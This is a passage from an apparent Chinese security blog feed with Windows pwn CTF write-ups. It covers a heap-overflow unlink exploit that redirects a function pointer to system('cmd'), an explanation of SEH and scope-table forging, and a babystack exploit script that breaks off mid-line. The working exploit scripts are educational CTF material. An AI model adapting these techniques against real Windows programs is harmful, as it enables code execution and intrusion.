class="line">   heapProperties = MyHeapEntry_0[entryOffset].func_ptr;</span><br><span class="line">   contentAddress = MyHeapEntry_0[entryOffset].heap_addr;</span><br><span class="line">   contentSize = <span class="number">16</span> * ((<span class="type">unsigned</span> __int8)heapProperties &amp; <span class="number">0xF</span>);</span><br><span class="line">   inputChar = getchar();</span><br><span class="line">   <span class="keyword">if</span> ( inputChar != <span class="number">10</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">do</span></span><br><span class="line">     &#123;</span><br><span class="line">       contentAddress[contentIndex] = inputChar;</span><br><span class="line">       <span class="keyword">if</span> ( ++contentIndex == contentSize - <span class="number">1</span> )</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">       inputChar = getchar();</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">while</span> ( inputChar != <span class="number">10</span> );</span><br><span class="line">     printString = (<span class="type">void</span> (__cdecl *)(<span class="type">const</span> <span class="type">char</span> *))<span class="built_in">puts</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   contentAddress[contentIndex] = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure><p>edit操作，Size会多乘以0x10，因此是有个堆溢出的漏洞的</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>因为开了<code>ASLR</code>，先想的是通过<code>free</code>后的<code>Flink</code>来泄露<code>heap_base</code>，会发现其实存储每一个堆条目信息的，也是存储在heap上的，因此就可以打unlink辣</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">p = run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;option &gt;\r\n&#x27;</span>,tbs(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;size &gt;\r\n&#x27;</span>,tbs(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index &gt;\r\n&#x27;</span>,tbs(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index &gt;\r\n&#x27;</span>,tbs(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index &gt;\r\n&#x27;</span>,tbs(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;content  &gt;\r\n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add(<span class="number">32</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">32</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">32</span>) <span class="comment">#2</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap_base = u32(ru(<span class="string">b&quot;\r\n&quot;</span>, drop=<span class="literal">True</span>)[:<span class="number">4</span>])-<span class="number">0x550</span></span><br><span class="line"></span><br><span class="line">leak(<span class="string">&quot;heap_base&quot;</span>,heap_base)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p32(heap_base+<span class="number">0x4A4</span>-<span class="number">4</span>)+p32(heap_base+<span class="number">0x4A4</span>))</span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line">pause()</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">image_base=u32(ru(<span class="string">b&quot;\r\n&quot;</span>, drop=<span class="literal">True</span>)[:<span class="number">4</span>])-<span class="number">0x1043</span></span><br><span class="line">leak(<span class="string">&quot;image_base&quot;</span>,image_base)</span><br><span class="line"></span><br><span class="line">puts_iat = image_base + <span class="number">0x20c4</span></span><br><span class="line">edit(<span class="number">1</span>, p32(puts_iat)+p32(<span class="number">0</span>)+p32(heap_base+<span class="number">0x4A4</span>));show(<span class="number">1</span>)             </span><br><span class="line">ucrt_base = u32(r(<span class="number">4</span>))-<span class="number">0xb89f0</span></span><br><span class="line">log.warn(<span class="string">&quot;ucrt_base:&quot;</span> + <span class="built_in">hex</span>(ucrt_base))</span><br><span class="line">system = ucrt_base+<span class="number">0xefda0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># modify func pointer to system and tigger it</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;cmd\x00&#x27;</span>)                                             </span><br><span class="line">edit(<span class="number">2</span>, p32(system)+p32(heap_base+<span class="number">0x6D0</span>))                         </span><br><span class="line">show(<span class="number">0</span>)                                                          </span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><blockquote><p>不过我在书写脚本的时候，发现unlink的时候，得在x32dbg附加调试才能过得去free（不知道为什么）</p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.slideshare.net/slideshow/windows-10-nt-heap-exploitation-chinese-version/154047090">angel boy</a></p><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/07/09/winpwn/">xuanxuanblingbling</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;windows堆基础知识&quot;&gt;&lt;a href=&quot;#windows堆基础知识&quot; class=&quot;headerlink&quot; title=&quot;windows堆基础知识&quot;&gt;&lt;/a&gt;windows堆基础知识&lt;/h2&gt;&lt;p&gt;win10的memory allocator基本上分为两种：</summary>
      
    
    
    
    <category term="windows" scheme="http://s1nec-1o.github.io/categories/windows/"/>
    
    <category term="heap" scheme="http://s1nec-1o.github.io/categories/windows/heap/"/>
    
    
    <category term="windows pwn" scheme="http://s1nec-1o.github.io/tags/windows-pwn/"/>
    
  </entry>
  
  <entry>
    <title>windows pwn初探(1)</title>
    <link href="http://s1nec-1o.github.io/2025/05/08/windows-pwn%E5%88%9D%E6%8E%A2-1/"/>
    <id>http://s1nec-1o.github.io/2025/05/08/windows-pwn%E5%88%9D%E6%8E%A2-1/</id>
    <published>2025-05-08T06:27:53.000Z</published>
    <updated>2025-05-10T07:19:40.999Z</updated>
    
    <content type="html"><![CDATA[<h1 id="window-pwn"><a href="#window-pwn" class="headerlink" title="window_pwn"></a>window_pwn</h1><p><a href="https://www.anquanke.com/post/id/188170#h3-1">https://www.anquanke.com/post/id/188170#h3-1</a></p><h2 id="SEH相关数据结构"><a href="#SEH相关数据结构" class="headerlink" title="SEH相关数据结构"></a>SEH相关数据结构</h2><h3 id="TIB结构"><a href="#TIB结构" class="headerlink" title="TIB结构"></a>TIB结构</h3><p><code>TIB</code>，即线程信息块，是保存线程基本信息的数据结构，它位于<code>TEB</code>的头部。<code>TEB</code>是操作系统为了保存每个线程的数据创建的，每个线程都有自己的<code>TEB</code>。</p><p>TIB结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">Exceptionlist</span>;</span><span class="comment">//指向异常处理链表</span></span><br><span class="line">    PVOID StackBase;<span class="comment">//当前进程所使用的栈的栈底</span></span><br><span class="line">    PVOID StackLimit;<span class="comment">//当前进程所使用的栈的栈顶</span></span><br><span class="line">    PVOID SubSystemTib;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        PVOID FiberData;</span><br><span class="line">        ULONG Version;</span><br><span class="line">    &#125;;</span><br><span class="line">    PVOID ArbitraryUserPointer;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> *<span class="title">Self</span>;</span><span class="comment">//指向TIB结构自身</span></span><br><span class="line">&#125; NT_TIB;</span><br></pre></td></tr></table></figure><p>在这个结构中与异常处理有关的第一个成员：指向<code>_EXCEPTION_REGISTRATION_RECORD</code>结构的<code>Exceptionlist</code>指针</p><h3 id="EXCEPTION-REGISTRATION-RECORD-结构"><a href="#EXCEPTION-REGISTRATION-RECORD-结构" class="headerlink" title="_EXCEPTION_REGISTRATION_RECORD 结构"></a>_EXCEPTION_REGISTRATION_RECORD 结构</h3><p>该结构主要用于描述线程异常处理过程的地址，该结构的链表描述了多个线程异常处理过程的层次关系</p><p>结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">Next</span>;</span><span class="comment">//指向下一个结构的指针</span></span><br><span class="line">    PEXCEPTION_ROUTINE Handler;<span class="comment">//当前异常处理回调函数的地址</span></span><br><span class="line">&#125;EXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure><p>结构如图所示：</p><img src="https://s2.ax1x.com/2019/10/09/uI9Auq.png" alt="img" style="zoom: 67%;" /><p>格式化之后的这个结构体中的<code>*Next</code>必须是原来的，所以我们要事先泄露出来原<code>*Next</code></p><h3 id="SEH范围表结构"><a href="#SEH范围表结构" class="headerlink" title="SEH范围表结构"></a>SEH范围表结构</h3><p>在Scope表中保存了<code>__try</code>块相匹配的<code>__except</code>或<code>__finally</code>的地址值<br>结构如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_EH4_SCOPETABLE</span> &#123;</span><br><span class="line">        DWORD GSCookieOffset;</span><br><span class="line">        DWORD GSCookieXOROffset;</span><br><span class="line">        DWORD EHCookieOffset;</span><br><span class="line">        DWORD EHCookieXOROffset;</span><br><span class="line">        _EH4_SCOPETABLE_RECORD ScopeRecord[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_EH4_SCOPETABLE_RECORD</span> &#123;</span><br><span class="line">        DWORD EnclosingLevel;</span><br><span class="line">        <span class="built_in">long</span> (*FilterFunc)();</span><br><span class="line">            <span class="keyword">union</span> &#123;</span><br><span class="line">            <span class="built_in">void</span> (*HandlerAddress)();</span><br><span class="line">            <span class="built_in">void</span> (*FinallyFunc)(); </span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>windows pwn的关键就是伪造<code>scope table</code>结构体，它的地址位于栈上的位置在<code>ebp-0x8</code>，存入的值是和<code>___security_cookie</code>异或者之后的结果，所以我们伪造它，就必须先泄露出来<code>___security_cookie</code>的值</p><p>当程序触发异常后，会执行类似这样的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:00401B50                 push    ebp</span><br><span class="line">.text:00401B51                 mov     ebp, esp</span><br><span class="line">.text:00401B53                 mov     eax, [ebp+arg_C]</span><br><span class="line">.text:00401B56                 push    eax</span><br><span class="line">.text:00401B57                 mov     ecx, [ebp+arg_8]</span><br><span class="line">.text:00401B5A                 push    ecx</span><br><span class="line">.text:00401B5B                 mov     edx, [ebp+arg_4]</span><br><span class="line">.text:00401B5E                 push    edx</span><br><span class="line">.text:00401B5F                 mov     eax, [ebp+arg_0]</span><br><span class="line">.text:00401B62                 push    eax</span><br><span class="line">.text:00401B63                 push    offset j_@__security_check_cookie@4 ; __security_check_cookie(x)</span><br><span class="line">.text:00401B68                 push    offset ___security_cookie</span><br><span class="line">.text:00401B6D                 call    _except_handler4_common</span><br><span class="line">.text:00401B72                 add     esp, 18h</span><br><span class="line">.text:00401B75                 pop     ebp</span><br><span class="line">.text:00401B76                 retn</span><br><span class="line">.text:00401B76 SEH_4013A0      endp</span><br></pre></td></tr></table></figure><p>调用了<code>_except_handler4_common</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl _except_handler4_common(<span class="type">unsigned</span> <span class="type">int</span> *securityCookies, <span class="type">void</span> (__fastcall *cookieCheckFunction)(<span class="type">unsigned</span> <span class="type">int</span>), _EXCEPTION_RECORD *exceptionRecord, <span class="type">unsigned</span> __int32 sehFrame, _CONTEXT *context)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 异或解密 scope table</span></span><br><span class="line">    scopeTable_1 = (_EH4_SCOPETABLE *)(*securityCookies ^ *(_DWORD *)(sehFrame + <span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sehFrame 等于 上图 ebp - 10h 位置, framePointer 等于上图 ebp 的位置</span></span><br><span class="line">    framePointer = (<span class="type">char</span> *)(sehFrame + <span class="number">16</span>);</span><br><span class="line">    scopeTable = scopeTable_1;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 验证 GS</span></span><br><span class="line">    ValidateLocalCookies(cookieCheckFunction, scopeTable_1, (<span class="type">char</span> *)(sehFrame + <span class="number">16</span>));</span><br><span class="line">    __except_validate_context_record(context);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( exceptionRecord-&gt;ExceptionFlags &amp; <span class="number">0x66</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        exceptionPointers.ExceptionRecord = exceptionRecord;</span><br><span class="line">        exceptionPointers.ContextRecord = context;</span><br><span class="line">        tryLevel = *(_DWORD *)(sehFrame + <span class="number">12</span>);</span><br><span class="line">        *(_DWORD *)(sehFrame - <span class="number">4</span>) = &amp;exceptionPointers;</span><br><span class="line">        <span class="keyword">if</span> ( tryLevel != <span class="number">-2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                v8 = tryLevel + <span class="number">2</span> * (tryLevel + <span class="number">2</span>);</span><br><span class="line">                filterFunc = (<span class="type">int</span> (__fastcall *)(_DWORD, _DWORD))*(&amp;scopeTable_1-&gt;GSCookieXOROffset + v8);</span><br><span class="line">                scopeTableRecord = (_EH4_SCOPETABLE_RECORD *)((<span class="type">char</span> *)scopeTable_1 + <span class="number">4</span> * v8);</span><br><span class="line">                encloseingLevel = scopeTableRecord-&gt;EnclosingLevel;</span><br><span class="line">                scopeTableRecord_1 = scopeTableRecord;</span><br><span class="line">                <span class="keyword">if</span> ( filterFunc )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 调用 FilterFunc</span></span><br><span class="line">                    filterFuncRet = _EH4_CallFilterFunc(filterFunc);</span><br><span class="line">                    ......</span><br><span class="line">                    <span class="keyword">if</span> ( filterFuncRet &gt; <span class="number">0</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                        ......</span><br><span class="line">                        <span class="comment">// 调用 HandlerFunc</span></span><br><span class="line">                        _EH4_TransferToHandler(scopeTableRecord_1-&gt;HandlerFunc, v5 + <span class="number">16</span>);</span><br><span class="line">                        ......</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                ......</span><br><span class="line">                tryLevel = encloseingLevel;</span><br><span class="line">                <span class="keyword">if</span> ( encloseingLevel == <span class="number">-2</span> )</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                scopeTable_1 = scopeTable;</span><br><span class="line">            &#125;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在函数中前置调用了<code>scope table</code>结构体中的<code>FilterFunc</code>函数和<code>HandlerFunc</code>函数，那么我们就可以将这两个函数地址复制为我们的shell代码，当触发异常时就会执行shell代码，即可获取到shell</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>通过查看我们发现在栈上还有一个特殊的值，位置在<code>ebp-0x1c</code>处</p><p><img src="https://s2.ax1x.com/2019/10/09/uIFey9.png" alt="img"></p><p>而<code>scope table</code>结构体地址在它的下面，所以我们必须还要格式化这个值。格式化它由两种方法组成，第一种消耗掉出去，构造payload的时候再填充进去即可；另一种方法就是计算出来：<code>值=___security_cookie^ebp</code></p><blockquote><p>感觉说这么多理论的也不是很能理解，遂做点题来理解理解</p><p>不过在64位下的SEH结构体就不在栈上了，利用会更加困难</p></blockquote><h2 id="window下ASLR的脆弱性："><a href="#window下ASLR的脆弱性：" class="headerlink" title="window下ASLR的脆弱性："></a>window下ASLR的脆弱性：</h2><p><a href="https://www.morphisec.com/blog/aslr-what-it-is-and-what-it-isnt/">https://www.morphisec.com/blog/aslr-what-it-is-and-what-it-isnt/</a></p><ol><li>DLL的基地址基于启动时随机化，DLL的基地址只在系统启动时会随机化，因此只需结合内存泄露或暴力破解等漏洞即可利用</li><li>ASLR不提供有关攻击的信息、发生攻击时ASLR不会发出警报</li><li>地址空间布局随机化 (ASLR) 旨在阻止攻击可靠地到达其目标内存地址。ASLR 的重点并非在于捕获攻击，而是在于使攻击难以得逞。</li><li>如果可执行文件或 DLL 文件未启用 ASLR 支持，则不支持ASLR。</li></ol><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h3><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505081433006.png" alt="image-20250506202655846"></p><p>程序中有着10次的泄露数据，以及给了main和栈的地址，并且有着一个栈溢出的漏洞</p><p>因此考虑覆盖SEH结构体以达到getshell的目的</p><p>攻击流程：</p><ul><li><p>泄露<code>__security_cookie</code>，他的地址是<code>main_addr+0x2f54</code>；然后泄露<code>_EXCEPTION_REGISTRATION_RECORD</code>结构体中<code>Next</code>成员，通过x32dbg调试可以发现在ebp-0x10的位置就是next字段</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505081433007.png" alt="image-20250506214348433" style="zoom:33%;" /><p>可以看到这个<code>RECORD</code>结构体是存储在栈上的；然后看到ED0的位置，便是GS即<code>ebp-0x1c</code>的位置</p></li><li><p>格式<code>hardler</code>结构体</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SEH_scope_table = p32(<span class="number">0x0FFFFFFE4</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0xFFFFFF20</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0xFFFFFFFE</span>)</span><br><span class="line">SEH_scope_table += p32(shell_addr)</span><br></pre></td></tr></table></figure><ul><li>通过栈溢出对内存进行覆盖，使程序异常来触发执行原始的代码段（访问非法内存之类的，理论上来说我可以把返回地址填满<code>null</code>，那么<code>0x0000000</code>处无法访问，会触发<code>SHE</code>；但是这题可以直接访问非法的内存）</li></ul><p>这里有个比较容易出错的点就是在v9一开始的4个字节之后会被覆盖，因此要先用<code>b&#39;aaaa&#39;</code>填充</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment"># context(os=&#x27;linux&#x27; , arch=&#x27;amd64&#x27; , log_level=&#x27;debug&#x27;)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># libc=ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line">path=<span class="string">&#x27;./babystack.exe&#x27;</span></span><br><span class="line"><span class="comment"># elf=ELF(path)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># amd64shell=b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span></span><br><span class="line"><span class="comment"># ae64 = AE64()</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> s,n     :<span class="built_in">print</span>(<span class="string">&quot;\033[31m[&quot;</span>+s+<span class="string">&quot; -&gt; &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(n))+<span class="string">&quot;]\033[0m&quot;</span>)</span><br><span class="line">fmt =<span class="keyword">lambda</span> string:<span class="built_in">eval</span>(<span class="string">f&quot;f&#x27;&#x27;&#x27;<span class="subst">&#123;string&#125;</span>&#x27;&#x27;&#x27;&quot;</span>, <span class="built_in">globals</span>()).encode()</span><br><span class="line">r64 =<span class="keyword">lambda</span>                         :u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#fmt(&#x27;%&#123;one_gadget &amp; 0xffff&#125;c&#x27;)</span></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p, duan)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">p = run()</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;stack address = 0x&#x27;</span>)</span><br><span class="line">stack_address = <span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&quot;stack_address&quot;</span>,stack_address)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">main_addr = <span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&quot;main_address&quot;</span>,main_addr)</span><br><span class="line"></span><br><span class="line">___security_cookie_addr=main_addr+<span class="number">0x2F54</span></span><br><span class="line">sla(<span class="string">b&#x27;more?\r\n&#x27;</span>,<span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Where do you want to know\r\n&#x27;</span>,<span 